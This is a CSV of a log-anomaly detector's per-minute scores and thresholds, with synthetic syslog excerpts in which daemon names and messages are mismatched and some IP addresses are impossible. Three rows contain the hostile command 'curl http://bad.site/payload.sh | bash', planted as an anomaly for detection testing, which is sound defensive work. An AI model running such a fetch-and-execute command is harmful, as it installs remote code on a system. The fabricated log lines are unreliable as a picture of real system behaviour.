bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 00:10:00,0.9891335015573193,0,0,0.9999894441123176,3,62,chronyd: Started Cleanup of Temporary Directories. || xinetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || chronyd: Started Cleanup of Temporary Directories. || named: Accepted publickey for user
2026-07-01 00:11:00,0.9582547452561695,0,0,0.9999894441123176,3,58,cups: Started Session c8 of user root. || cups: Listening on LVM2 poll daemon socket. || xinetd: Listening on LVM2 poll daemon socket. || telnetd: Started Session c193 of user root. || rsyslogd: Rotating log files. || systemd-timesyncd: Rotating log 
2026-07-01 00:12:00,0.9990953372045531,0,0,0.9999894441123176,3,61,cups: Synced RTC time from system clock. || smartd: Started Cleanup of Temporary Directories. || ftpd: Synced RTC time from system clock. || logrotate: Started Cleanup of Temporary Directories. || redis-server: Finished Daily apt download activities.
2026-07-01 00:13:00,0.9987617944017614,0,0,0.9999894441123176,3,62,ftpd: Synced RTC time from system clock. || ufw: Rotating log files. || xinetd: Started Session c216 of user root. || ftpd: Synced RTC time from system clock. || ufw: Started Cleanup of Temporary Directories. || logrotate: Listening on LVM2 poll daem
2026-07-01 00:14:00,0.9997498698525119,0,0,0.9999894441123176,3,60,dockerd: Finished Daily apt download activities. || ufw: Started Session c241 of user root. || sshd: Accepted publickey for user from 10.0.0.95 port 22 ssh2. || unix_chkpwd: Rotating log files. || docker: Started CUPS Scheduler. || logrotate: Started
2026-07-01 00:15:00,0.9988477584773294,0,0,0.9999894441123176,3,63,smartd: Finished Daily apt download activities. || named: Synced RTC time from system clock. || sudo: Rotating log files. || kernel: Listening on LVM2 poll daemon socket. || smartd: Started CUPS Scheduler. || sudo: Started CUPS Scheduler. || redis-se
2026-07-01 00:16:00,0.9999467586958798,0,0,0.9999894441123176,3,59,sshd: Listening on LVM2 poll daemon socket. || docker: Listening on LVM2 poll daemon socket. || chronyd: Started Session c135 of user root. || dockerd: Finished Daily apt download activities. || named: Listening on LVM2 poll daemon socket. || gpm: St
2026-07-01 00:17:00,0.9998688256950073,0,0,0.9999894441123176,3,60,docker: Started Session c4 of user root. || gpm: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || unattended-upgrades: Accepted publickey for user from 10.0.0.79 port 22 ssh2. || gpm: Accepted public
2026-07-01 00:18:00,0.9986837372192143,0,0,0.9999894441123176,3,61,logrotate: Started CUPS Scheduler. || telnetd: Finished Daily apt download activities. || ufw: Started Session c239 of user root. || cups: Finished Daily apt download activities. || dockerd: Accepted publickey for user from 10.0.0.227 port 22 ssh2. |
2026-07-01 00:19:00,0.9997254901456217,0,0,0.9999894441123176,3,60,logrotate: Accepted publickey for user from 10.0.0.182 port 22 ssh2. || smartd: Started CUPS Scheduler. || dockerd: Rotating log files. || redis-server: Finished Daily apt download activities. || unattended-upgrades: Listening on LVM2 poll daemon soc
2026-07-01 00:20:00,0.9994614071539485,0,0,0.9999894441123176,3,59,sudo: Started Session c184 of user root. || dockerd: Accepted publickey for user from 10.0.0.124 port 22 ssh2. || kernel: Started CUPS Scheduler. || telnetd: Accepted publickey for user from 10.0.0.76 port 22 ssh2. || ufw: Finished Daily apt download
2026-07-01 00:21:00,0.9945914779934256,0,0,0.9999894441123176,3,60,ftpd: Synced RTC time from system clock. || ufw: Started Session c174 of user root. || logrotate: Finished Daily apt download activities. || CRON: Finished Daily apt download activities. || ftpd: app[1234]: segfault at 0 ip 00007f stackpointer error 
2026-07-01 00:22:00,0.9975321224876306,0,0,0.9999894441123176,3,62,ufw: Started Session c250 of user root. || ntpd: Synced RTC time from system clock. || cups: Started Session c138 of user root. || redis-server: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || sudo: Synced RTC time from 
2026-07-01 00:23:00,0.9998815491897114,0,0,0.9999894441123176,3,62,dockerd: Finished Daily apt download activities. || redis-server: Failed password for invalid user test from 192.168.1.60917 port 22 ssh2 || rsyslogd: Started CUPS Scheduler. || ntpd: Listening on LVM2 poll daemon socket. || kernel: Synced RTC time f
2026-07-01 00:24:00,0.9999607044503777,0,0,0.9999894441123176,3,62,cups: Finished Daily apt download activities. || rsyslogd: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. || telnetd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 |
2026-07-01 00:25:00,0.9992140184351973,0,0,0.9999894441123176,3,62,smartd: Finished Daily apt download activities. || rsyslogd: Accepted publickey for user from 10.0.0.27 port 22 ssh2. || dockerd: Started CUPS Scheduler. || CRON: Started CUPS Scheduler. || NetworkManager: Finished Daily apt download activities. || c
2026-07-01 00:26:00,0.9976297286933443,0,0,0.9999894441123176,3,58,telnetd: Started CUPS Scheduler. || ntpd: Listening on LVM2 poll daemon socket. || chronyd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || cups: Finished Daily apt download activities. || kernel: Started 
2026-07-01 00:27:00,0.9999375224795835,0,0,0.9999894441123176,3,60,named: Synced RTC time from system clock. || gpm: Started Cleanup of Temporary Directories. || unattended-upgrades: kernel: Out of memory: Kill process 55639 (python3) score 987 or sacrifice child || docker: Started Session c159 of user root. || syst
2026-07-01 00:28:00,0.9997248257895384,0,0,0.9999894441123176,3,57,CRON: Rotating log files. || smartd: Synced RTC time from system clock. || telnetd: Accepted publickey for user from 10.0.0.217 port 22 ssh2. || cups: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || CRON: Started CUPS Sc
2026-07-01 00:29:00,0.9966822839364708,0,0,0.9999894441123176,3,59,logrotate: Rotating log files. || docker: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || rsyslogd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Cleanup of Temporary Directories. || ftpd: Finish
2026-07-01 00:30:00,0.9999463130881953,0,0,0.9999894441123176,3,62,chronyd: Listening on LVM2 poll daemon socket. || logrotate: Failed password for invalid user test from 192.168.1.16569 port 22 ssh2 || systemd-timesyncd: Started Session c232 of user root. || xinetd: Started Session c164 of user root. || redis-serve
2026-07-01 00:31:00,0.9996225999175685,0,0,0.9999894441123176,3,60,docker: Started Cleanup of Temporary Directories. || dockerd: Started CUPS Scheduler. || docker: Listening on LVM2 poll daemon socket. || systemd: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || unattended-u
2026-07-01 00:32:00,0.9999589488321595,0,0,0.9999894441123176,3,65,docker: Listening on LVM2 poll daemon socket. || telnetd: Started Session c187 of user root. || unix_chkpwd: Finished Daily apt download activities. || CRON: Started Session c153 of user root. || dockerd: Rotating log files. || systemd: Finished Dail
2026-07-01 00:33:00,0.9998339372072227,0,0,0.9999894441123176,3,59,ftpd: Synced RTC time from system clock. || dockerd: Accepted publickey for user from 10.0.0.135 port 22 ssh2. || ftpd: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || CRON: Started Session c232 of 
2026-07-01 00:34:00,0.9984354949486475,0,0,0.9999894441123176,3,63,sudo: Accepted publickey for user from 10.0.0.246 port 22 ssh2. || logrotate: Rotating log files. || unix_chkpwd: Started Session c29 of user root. || ufw: Rotating log files. || ntpd: Started CUPS Scheduler. || smartd: Started Session c25 of user ro
2026-07-01 00:35:00,0.9972327663579325,0,0,0.9999894441123176,3,59,ntpd: Started CUPS Scheduler. || telnetd: Synced RTC time from system clock. || systemd-timesyncd: Finished Daily apt download activities. || rsyslogd: Started Session c163 of user root. || docker: Accepted publickey for user from 10.0.0.173 port 22 
2026-07-01 00:36:00,0.9994866376376574,0,0,0.9999894441123176,3,59,ufw: Started Session c187 of user root. || unix_chkpwd: Started CUPS Scheduler. || sudo: Rotating log files. || ntpd: Synced RTC time from system clock. || CRON: Started CUPS Scheduler. || rsyslogd: Started Cleanup of Temporary Directories. || telnet
2026-07-01 00:37:00,0.9962477090653898,0,0,0.9999894441123176,3,61,unattended-upgrades: Started Session c79 of user root. || unattended-upgrades: Started CUPS Scheduler. || kernel: Started Cleanup of Temporary Directories. || unattended-upgrades: Listening on LVM2 poll daemon socket. || named: Started CUPS Scheduler
2026-07-01 00:38:00,0.999088819478567,0,0,0.9999894441123176,3,59,dockerd: Accepted publickey for user from 10.0.0.24 port 22 ssh2. || dockerd: Started Session c222 of user root. || docker: Started Cleanup of Temporary Directories. || rsyslogd: Started Cleanup of Temporary Directories. || dockerd: Started Session c
2026-07-01 00:39:00,0.9985551504944451,0,0,0.9999894441123176,3,63,unattended-upgrades: Started Cleanup of Temporary Directories. || logrotate: Started Session c13 of user root. || gpm: Rotating log files. || sudo: Started Session c4 of user root. || xinetd: Rotating log files. || CRON: Started CUPS Scheduler. || xi
2026-07-01 00:40:00,0.999949103160094,0,0,0.9999894441123176,3,60,named: Listening on LVM2 poll daemon socket. || telnetd: Listening on LVM2 poll daemon socket. || rsyslogd: Synced RTC time from system clock. || ftpd: Finished Daily apt download activities. || gpm: Finished Daily apt download activities. || systemd
2026-07-01 00:41:00,0.9994982988700335,0,0,0.9999894441123176,3,62,gpm: Finished Daily apt download activities. || xinetd: Accepted publickey for user from 10.0.0.174 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock. || kernel: Synced RTC time from system clock. || systemd: Finished Daily apt 
2026-07-01 00:42:00,0.999932498023674,0,0,0.9999894441123176,3,58,xinetd: Started CUPS Scheduler. || named: bash: -c: line 1: curl http://bad.site/payload.sh | bash || smartd: Listening on LVM2 poll daemon socket. || systemd: Accepted publickey for user from 10.0.0.184 port 22 ssh2. || cups: Started Session c158 of
2026-07-01 00:43:00,0.9972392996443612,0,0,0.9999894441123176,3,61,sshd: Started Session c2 of user root. || sshd: Listening on LVM2 poll daemon socket. || redis-server: Started Cleanup of Temporary Directories. || rsyslogd: Started Session c28 of user root. || systemd: Started CUPS Scheduler. || systemd: Synced RTC
2026-07-01 00:44:00,0.9986198129379605,0,0,0.9999894441123176,3,61,ftpd: Accepted publickey for user from 10.0.0.178 port 22 ssh2. || NetworkManager: Synced RTC time from system clock. || unattended-upgrades: Rotating log files. || ntpd: Started CUPS Scheduler. || smartd: Listening on LVM2 poll daemon socket. || gpm
2026-07-01 00:45:00,0.9996243914651658,0,0,0.9999894441123176,3,60,docker: Started CUPS Scheduler. || docker: Rotating log files. || sudo: Failed password for invalid user test from 192.168.1.54593 port 22 ssh2 || rsyslogd: Rotating log files. || smartd: Started Cleanup of Temporary Directories. || dockerd: Listenin
2026-07-01 00:46:00,0.9993405228622976,0,0,0.9999894441123176,3,63,redis-server: Rotating log files. || smartd: Started CUPS Scheduler. || unix_chkpwd: Rotating log files. || ntpd: Started Cleanup of Temporary Directories. || systemd: Accepted publickey for user from 10.0.0.17 port 22 ssh2. || rsyslogd: kernel: Out 
2026-07-01 00:47:00,0.999953342349167,0,0,0.9999894441123176,3,61,gpm: Started Session c250 of user root. || NetworkManager: Accepted publickey for user from 10.0.0.190 port 22 ssh2. || ufw: Finished Daily apt download activities. || redis-server: Rotating log files. || unattended-upgrades: Started CUPS Scheduler. 
2026-07-01 00:48:00,0.9998661800153584,0,0,0.9999894441123176,3,60,unix_chkpwd: Started CUPS Scheduler. || named: Failed password for invalid user test from 192.168.1.555 port 22 ssh2 || CRON: Listening on LVM2 poll daemon socket. || unix_chkpwd: Started CUPS Scheduler. || redis-server: Started CUPS Scheduler. || un
2026-07-01 00:49:00,0.999947562121762,0,0,0.9999894441123176,3,61,unattended-upgrades: Listening on LVM2 poll daemon socket. || dockerd: Finished Daily apt download activities. || xinetd: Listening on LVM2 poll daemon socket. || redis-server: Started Session c10 of user root. || CRON: Listening on LVM2 poll daemon 
2026-07-01 00:50:00,0.9999191008435973,0,0,0.9999894441123176,3,61,CRON: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. || named: Rotating log files. || sudo: Finished Daily apt download activities. || cups: Started Cleanup of Temporary Directories. || telnetd: Accepted p
2026-07-01 00:51:00,0.9998902355328794,0,0,0.9999894441123176,3,61,docker: Listening on LVM2 poll daemon socket. || chronyd: Synced RTC time from system clock. || ftpd: Synced RTC time from system clock. || systemd-timesyncd: Started Cleanup of Temporary Directories. || xinetd: Synced RTC time from system clock. || 
2026-07-01 00:52:00,0.999366014045718,0,0,0.9999894441123176,3,61,ntpd: Accepted publickey for user from 10.0.0.40 port 22 ssh2. || kernel: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd-timesyncd: Started CUPS Scheduler. || ufw: Accepted publickey for user from 10.0.0.43 port 22 ssh2. || docke
2026-07-01 00:53:00,0.9994465545297054,0,0,0.9999894441123176,3,63,gpm: Started Session c11 of user root. || kernel: Rotating log files. || kernel: Started CUPS Scheduler. || systemd: kernel: Kernel panic - not syncing: Fatal exception || dockerd: Started Session c154 of user root. || smartd: Accepted publickey for 
2026-07-01 00:54:00,0.9992694391095168,0,0,0.9999894441123176,3,63,systemd-timesyncd: Started CUPS Scheduler. || chronyd: Synced RTC time from system clock. || ntpd: Started Cleanup of Temporary Directories. || logrotate: Finished Daily apt download activities. || chronyd: Started CUPS Scheduler. || logrotate: Liste
2026-07-01 00:55:00,0.9918062313503524,0,0,0.9999894441123176,3,63,unix_chkpwd: Started Cleanup of Temporary Directories. || ntpd: Listening on LVM2 poll daemon socket. || ntpd: Rotating log files. || cups: Rotating log files. || kernel: Started Session c143 of user root. || telnetd: Finished Daily apt download acti
2026-07-01 00:56:00,0.9666200881247504,0,0,0.9999894441123176,3,60,ftpd: Started Session c43 of user root. || named: Synced RTC time from system clock. || gpm: Started Cleanup of Temporary Directories. || sshd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.62721 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || unix_chkpwd
2026-07-01 00:57:00,0.9935094975294145,0,0,0.9999894441123176,3,60,systemd-timesyncd: Started Session c13 of user root. || sudo: Rotating log files. || cups: kernel: Out of memory: Kill process 5812 (python3) score 987 or sacrifice child || sshd: Accepted publickey for user from 10.0.0.152 port 22 ssh2. || systemd-t
2026-07-01 00:58:00,0.9963725815071862,0,0,0.9999894441123176,3,60,ufw: Finished Daily apt download activities. || cups: Synced RTC time from system clock. || sudo: Started Cleanup of Temporary Directories. || redis-server: Rotating log files. || kernel: Started CUPS Scheduler. || systemd: Started Cleanup of Tempora
2026-07-01 00:59:00,0.9283523918232981,0,0,0.9999894441123176,3,56,unix_chkpwd: Synced RTC time from system clock. || ftpd: Rotating log files. || xinetd: Synced RTC time from system clock. || named: Started Session c41 of user root. || logrotate: Started CUPS Scheduler. || systemd: Started Cleanup of Temporary Dire
2026-07-01 01:00:00,0.8811469515203972,0,0,0.9999894441123176,3,61,gpm: Accepted publickey for user from 10.0.0.128 port 22 ssh2. || systemd-timesyncd: Synced RTC time from system clock. || named: Started CUPS Scheduler. || unix_chkpwd: Synced RTC time from system clock. || systemd: Accepted publickey for user from 
2026-07-01 01:01:00,0.99055111478839,0,0,0.9999894441123176,3,60,unattended-upgrades: Started CUPS Scheduler. || redis-server: Accepted publickey for user from 10.0.0.202 port 22 ssh2. || gpm: Accepted publickey for user from 10.0.0.177 port 22 ssh2. || chronyd: Listening on LVM2 poll daemon socket. || chronyd: Li
2026-07-01 01:02:00,0.9921874554204354,0,0,0.9999894441123176,3,61,NetworkManager: Rotating log files. || docker: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || gpm: Rotating log files. || NetworkManager: Synced RTC time from system clock. || rsyslogd: Started Cleanup of Tempora
2026-07-01 01:03:00,0.9998817748887773,0,0,0.9999894441123176,3,60,sshd: Synced RTC time from system clock. || unattended-upgrades: Accepted publickey for user from 10.0.0.214 port 22 ssh2. || ntpd: Accepted publickey for user from 10.0.0.55 port 22 ssh2. || ntpd: Started Cleanup of Temporary Directories. || chronyd
2026-07-01 01:04:00,0.9990589934487895,0,0,0.9999894441123176,3,64,sshd: Accepted publickey for user from 10.0.0.88 port 22 ssh2. || CRON: Finished Daily apt download activities. || ftpd: Started Cleanup of Temporary Directories. || named: Started Cleanup of Temporary Directories. || redis-server: Rotating log files
2026-07-01 01:05:00,0.999956164257915,0,0,0.9999894441123176,3,60,unattended-upgrades: Started CUPS Scheduler. || systemd: Accepted publickey for user from 10.0.0.252 port 22 ssh2. || unattended-upgrades: Started Session c244 of user root. || redis-server: Started CUPS Scheduler. || named: Started Session c193 of u
2026-07-01 01:06:00,0.9996530792969515,0,0,0.9999894441123176,3,60,telnetd: Started Session c131 of user root. || ufw: Rotating log files. || rsyslogd: Started Cleanup of Temporary Directories. || named: Rotating log files. || systemd-timesyncd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || redis-serv
2026-07-01 01:07:00,0.999948321023747,0,0,0.9999894441123176,3,60,ufw: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || unattended-upgrades: Started Cleanup of Temporary Directories. || kernel: Accepted publickey for user from 10.0.0.89 port 22 ssh2. || ftpd: Rotating log files. || ftpd: Started CUPS Sc
2026-07-01 01:08:00,0.9997646472420862,0,0,0.9999894441123176,3,59,logrotate: Rotating log files. || ftpd: Synced RTC time from system clock. || rsyslogd: Listening on LVM2 poll daemon socket. || kernel: Started Cleanup of Temporary Directories. || sshd: Started CUPS Scheduler. || redis-server: Started Cleanup of Te
2026-07-01 01:09:00,0.9998930895729315,0,0,0.9999894441123176,3,62,sshd: Listening on LVM2 poll daemon socket. || gpm: Synced RTC time from system clock. || kernel: Rotating log files. || sudo: Accepted publickey for user from 10.0.0.94 port 22 ssh2. || redis-server: Synced RTC time from system clock. || logrotate: 
2026-07-01 01:10:00,0.9996655974235548,0,0,0.9999894441123176,3,61,systemd: Synced RTC time from system clock. || docker: Started CUPS Scheduler. || dockerd: Rotating log files. || kernel: Accepted publickey for user from 10.0.0.140 port 22 ssh2. || dockerd: Synced RTC time from system clock. || ftpd: Synced RTC tim
2026-07-01 01:11:00,0.999686148890912,0,0,0.9999894441123176,3,58,cups: Finished Daily apt download activities. || NetworkManager: Synced RTC time from system clock. || CRON: Listening on LVM2 poll daemon socket. || NetworkManager: Started Cleanup of Temporary Directories. || sshd: Accepted publickey for user from 
2026-07-01 01:12:00,0.9906335360878153,0,0,0.9999894441123176,3,60,unix_chkpwd: Started Session c158 of user root. || kernel: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd: Started Session c243 of user root. || named: Rotating log files. || sshd: Listening on LVM2 poll daemon socket. || named: 
2026-07-01 01:13:00,0.9999189063843084,0,0,0.9999894441123176,3,63,logrotate: Listening on LVM2 poll daemon socket. || smartd: Started Session c141 of user root. || unix_chkpwd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || rsyslogd: Finished Daily apt download activities.
2026-07-01 01:14:00,0.999008911403027,0,0,0.9999894441123176,3,60,ftpd: Started Cleanup of Temporary Directories. || named: Listening on LVM2 poll daemon socket. || xinetd: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Cleanup of Temporary Directories. || telnetd: Synced RTC time from sy
2026-07-01 01:15:00,0.9990872595751726,0,0,0.9999894441123176,3,63,unix_chkpwd: Finished Daily apt download activities. || cups: Listening on LVM2 poll daemon socket. || kernel: Started Session c171 of user root. || NetworkManager: Finished Daily apt download activities. || systemd-timesyncd: [UFW BLOCK] IN=eth0 OUT
2026-07-01 01:16:00,0.9969289421210739,0,0,0.9999894441123176,3,57,systemd-timesyncd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || xinetd: Started Session c129 of user root. || unattended-upgrades: Started Session c124 of user root. || chronyd: Synced RTC time from system
2026-07-01 01:17:00,0.9986507658776311,0,0,0.9999894441123176,3,63,docker: Synced RTC time from system clock. || telnetd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || cups: Rotating log files. || gpm: Started Cleanup of Temporary Directories. || cups: Synced RTC time from system clock. || chronyd: St
2026-07-01 01:18:00,0.9998782062319034,0,0,0.9999894441123176,3,59,unix_chkpwd: kernel: Out of memory: Kill process 57201 (python3) score 987 or sacrifice child || gpm: Finished Daily apt download activities. || smartd: Started Cleanup of Temporary Directories. || ntpd: Rotating log files. || systemd-timesyncd: Sync
2026-07-01 01:19:00,0.9988756790917327,0,0,0.9999894441123176,3,61,named: kernel: Out of memory: Kill process 12083 (python3) score 987 or sacrifice child || xinetd: Started Cleanup of Temporary Directories. || smartd: kernel: Kernel panic - not syncing: Fatal exception || systemd-timesyncd: Finished Daily apt downl
2026-07-01 01:20:00,0.9991082784427101,0,0,0.9999894441123176,3,60,ntpd: Rotating log files. || NetworkManager: Started Cleanup of Temporary Directories. || smartd: Started CUPS Scheduler. || kernel: Finished Daily apt download activities. || dockerd: Finished Daily apt download activities. || gpm: Finished Daily ap
2026-07-01 01:21:00,0.9990889743558489,0,0,0.9999894441123176,3,61,ntpd: Accepted publickey for user from 10.0.0.172 port 22 ssh2. || smartd: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || kernel: Listening on LVM2 poll daemon socket. || sshd: Accepted publickey for user from 10.0.0.191 
2026-07-01 01:22:00,0.9997836887275592,0,0,0.9999894441123176,3,60,xinetd: Started CUPS Scheduler. || logrotate: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.20718 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sshd: Finished Daily apt download activities. || systemd: Accepted publickey for user from 10.0.0.180 port 22
2026-07-01 01:23:00,0.9995604323107997,0,0,0.9999894441123176,3,63,smartd: Started Cleanup of Temporary Directories. || sudo: Listening on LVM2 poll daemon socket. || xinetd: Started Cleanup of Temporary Directories. || dockerd: Listening on LVM2 poll daemon socket. || CRON: Started Cleanup of Temporary Directories.
2026-07-01 01:24:00,0.9998831091966377,0,0,0.9999894441123176,3,58,named: Started CUPS Scheduler. || ftpd: Synced RTC time from system clock. || redis-server: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.23836 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || kernel: Started CUPS Scheduler. || chronyd: Rotating log files.
2026-07-01 01:25:00,0.9999044983219147,0,0,0.9999894441123176,3,61,systemd-timesyncd: Started Cleanup of Temporary Directories. || gpm: Started CUPS Scheduler. || redis-server: Synced RTC time from system clock. || CRON: Accepted publickey for user from 10.0.0.18 port 22 ssh2. || ntpd: Finished Daily apt download ac
2026-07-01 01:26:00,0.9998762865110715,0,0,0.9999894441123176,3,58,sshd: Started Session c251 of user root. || unattended-upgrades: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || xinetd: Started Session c242 of user root. || ufw: Finished Daily apt download activities. || named: Finished Daily
2026-07-01 01:27:00,0.9998938657052665,0,0,0.9999894441123176,3,63,docker: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || sshd: Listening on LVM2 poll daemon socket. || dockerd: Started CUPS Scheduler. || telnetd: Failed password for invalid user test from 192.168
2026-07-01 01:28:00,0.9995459014719146,0,0,0.9999894441123176,3,61,CRON: Accepted publickey for user from 10.0.0.171 port 22 ssh2. || dockerd: Rotating log files. || xinetd: Started Session c228 of user root. || sudo: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 ||
2026-07-01 01:29:00,0.998943414150067,0,0,0.9999894441123176,3,59,ufw: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || sshd: Finished Daily apt download activities. || unix_chkpwd: Started CUPS Scheduler. || chronyd: Started Cleanup of Temporary Directo
2026-07-01 01:30:00,0.9993265675150361,0,0,0.9999894441123176,3,59,NetworkManager: Finished Daily apt download activities. || chronyd: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Started Cleanup of Temporary Directories. || named: Finished Daily apt download activities. || sshd: Accepted publickey fo
2026-07-01 01:31:00,0.9992097689694196,0,0,0.9999894441123176,3,60,kernel: Rotating log files. || kernel: Started Session c154 of user root. || gpm: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || kernel: Started Session c222 of user root. || xinetd: Started Cleanup of Temporary Di
2026-07-01 01:32:00,0.9768474282402538,0,0,0.9999894441123176,3,62,dockerd: Accepted publickey for user from 10.0.0.44 port 22 ssh2. || NetworkManager: Listening on LVM2 poll daemon socket. || named: Started Session c63 of user root. || named: Started CUPS Scheduler. || xinetd: Started CUPS Scheduler. || NetworkMana
